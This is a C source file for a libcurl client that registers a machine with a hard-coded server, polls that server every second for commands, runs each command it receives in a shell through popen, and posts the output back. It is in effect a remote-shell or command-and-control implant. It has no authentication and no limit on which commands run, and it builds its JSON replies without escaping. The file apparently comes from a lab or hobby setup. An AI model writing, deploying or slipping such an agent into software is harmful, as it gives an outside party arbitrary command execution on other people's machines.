#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include <arpa/inet.h>
#include <netdb.h>

#define SERVER_IP "10.0.0.100"  // Change to your server IP
#define SERVER_PORT 5000
#define BUFFER_SIZE 4096

// ------------------- Helper for libcurl response -------------------
struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if(ptr == NULL) return 0;

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

// ------------------- Get local IP -------------------
void get_local_ip(char *ip_buffer, size_t len) {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    struct hostent *he = gethostbyname(hostname);
    if(he == NULL) {
        strncpy(ip_buffer, "127.0.0.1", len);
        return;
    }
    struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
    strncpy(ip_buffer, inet_ntoa(*addr_list[0]), len);
}

// ------------------- Register PC2 -------------------
void register_pc2(const char *my_ip, const char *name) {
    CURL *curl = curl_easy_init();
    if(!curl) return;

    char url[128];
    snprintf(url, sizeof(url), "http://%s:%d/register_pc2", SERVER_IP, SERVER_PORT);

    char json[256];
    snprintf(json, sizeof(json), "{\"ip\":\"%s\",\"name\":\"%s\"}", my_ip, name);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

    CURLcode res = curl_easy_perform(curl);
    if(res != CURLE_OK)
        fprintf(stderr, "Registration failed: %s\n", curl_easy_strerror(res));
    else
        printf("Registered with server.\n");

    curl_easy_cleanup(curl);
}

// ------------------- Poll command -------------------
int get_command(const char *my_ip, char *command, size_t len) {
    CURL *curl = curl_easy_init();
    if(!curl) return 0;

    char url[128];
    snprintf(url, sizeof(url), "http://%s:%d/get_command/%s", SERVER_IP, SERVER_PORT, my_ip);

    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

    CURLcode res = curl_easy_perform(curl);
    if(res != CURLE_OK) {
        fprintf(stderr, "Failed to get command: %s\n", curl_easy_strerror(res));
        free(chunk.memory);
        curl_easy_cleanup(curl);
        return 0;
    }

    strncpy(command, chunk.memory, len - 1);
    command[len-1] = '\0';
    free(chunk.memory);
    curl_easy_cleanup(curl);

    // Remove trailing newline
    size_t l = strlen(command);
    if(l>0 && command[l-1]=='\n') command[l-1]='\0';

    return (strcmp(command, "None") != 0 && strlen(command)>0);
}

// ------------------- Send response -------------------
void send_response(const char *my_ip, const char *output) {
    CURL *curl = curl_easy_init();
    if(!curl) return;

    char url[128];
    snprintf(url, sizeof(url), "http://%s:%d/send_response", SERVER_IP, SERVER_PORT);

    char json[BUFFER_SIZE];
    snprintf(json, sizeof(json), "{\"sender\":\"%s\",\"output\":\"%s\"}", my_ip, output);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

    CURLcode res = curl_easy_perform(curl);
    if(res != CURLE_OK)
        fprintf(stderr, "Failed to send response: %s\n", curl_easy_strerror(res));

    curl_easy_cleanup(curl);
}

// ------------------- Execute command -------------------
void execute_command(const char *command, char *output, size_t len) {
    FILE *fp = popen(command, "r");
    if(!fp) {
        snprintf(output, len, "Failed to execute command.");
        return;
    }

    size_t total = 0;
    char buf[256];
    while(fgets(buf, sizeof(buf), fp) != NULL) {
        size_t to_copy = strlen(buf);
        if(total + to_copy >= len) break;
        strcpy(output + total, buf);
        total += to_copy;
    }
    output[total] = '\0';
    pclose(fp);
}

// ------------------- Main -------------------
int main() {
    char my_ip[32];
    get_local_ip(my_ip, sizeof(my_ip));

    char hostname[64];
    gethostname(hostname, sizeof(hostname));

    curl_global_init(CURL_GLOBAL_DEFAULT);

    // Register with server
    register_pc2(my_ip, hostname);

    char command[BUFFER_SIZE];
    char output[BUFFER_SIZE];

    while(1) {
        if(get_command(my_ip, command, sizeof(command))) {
            printf("Received command: %s\n", command);
            execute_command(command, output, sizeof(output));
            printf("Sending response:\n%s\n", output);
            send_response(my_ip, output);
        }
        sleep(1); // Poll every second
    }

    curl_global_cleanup();
    return 0;
}

